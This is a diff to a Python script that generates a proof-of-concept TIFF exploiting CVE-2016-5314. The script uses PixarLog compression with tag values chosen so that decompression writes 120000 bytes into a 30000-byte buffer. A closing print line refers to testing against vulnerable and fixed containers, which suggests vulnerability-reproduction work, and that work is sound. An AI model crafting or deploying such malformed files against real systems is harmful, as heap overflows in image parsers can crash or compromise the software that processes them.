@@ -5,15 +5,14 @@ import os
 def build_poc():
     header = b"II\x2a\x00\x08\x00\x00\x00"
     
-    # We create a zlib payload that inflates to at least a few hundred bytes
-    raw_uncompressed_attack = b"A" * 1000
-    zlib_payload = zlib.compress(raw_uncompressed_attack)
+    # We create a zlib payload that inflates to the packed size for the strip
+    packed_size = 100 * 100 * 3  # 30000
+    zlib_payload = zlib.compress(b'A' * packed_size)
 
-    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=1 and ImageLength=10
-    # (small alloc) while letting decompression use the full image trust length.
-    # 10 strips are required (imageLength/rowsPerStrip), so we build a strip table
-    # with 10 offsets and byte counts, each pointing to a valid compressed strip.
-    num_strips = 10
+    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=100 and ImageLength=100
+    # (alloc 30000 bytes) while decompression writes 120000 bytes.
+    # 1 strip is required, so we build a strip table with 1 offset and byte count.
+    num_strips = 1
 
     # Build IFD entries; strip arrays will be stored after IFD.
     entries = [
@@ -36,14 +35,14 @@ def build_poc():
 
     entries = [
         (254, 4, 1, 0),             # NewSubfileType: 0
-        (256, 3, 1, 10),            # ImageWidth: 10
-        (257, 3, 1, 10),            # ImageLength: 10
+        (256, 3, 1, 100),           # ImageWidth: 100
+        (257, 3, 1, 100),           # ImageLength: 100
         (258, 3, 1, 8),             # BitsPerSample: 8 (all samples)
         (259, 3, 1, 32909),         # Compression: PIXARLOG
         (262, 3, 1, 2),             # PhotometricInterpretation: RGB
         (273, 4, num_strips, strip_offsets_offset),
         (277, 3, 1, 3),             # SamplesPerPixel: 3
-        (278, 4, 1, 1),             # RowsPerStrip: 1
+        (278, 4, 1, 100),           # RowsPerStrip: 100
         (279, 4, num_strips, strip_bytecounts_offset),
         (317, 3, 1, 2)              # Predictor: 2 (horizontal)
     ]
@@ -64,4 +63,4 @@ output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tas
 with open(output_path, "wb") as f:
     f.write(build_poc())
     
-print("PoC regenerated for CVE-2016-5314 (RowsPerStrip=1, ImageLength=10) - test with vuln/fixed containers")
+print("PoC regenerated for CVE-2016-5314 (RowsPerStrip=100, ImageLength=100) - test with vuln/fixed containers")
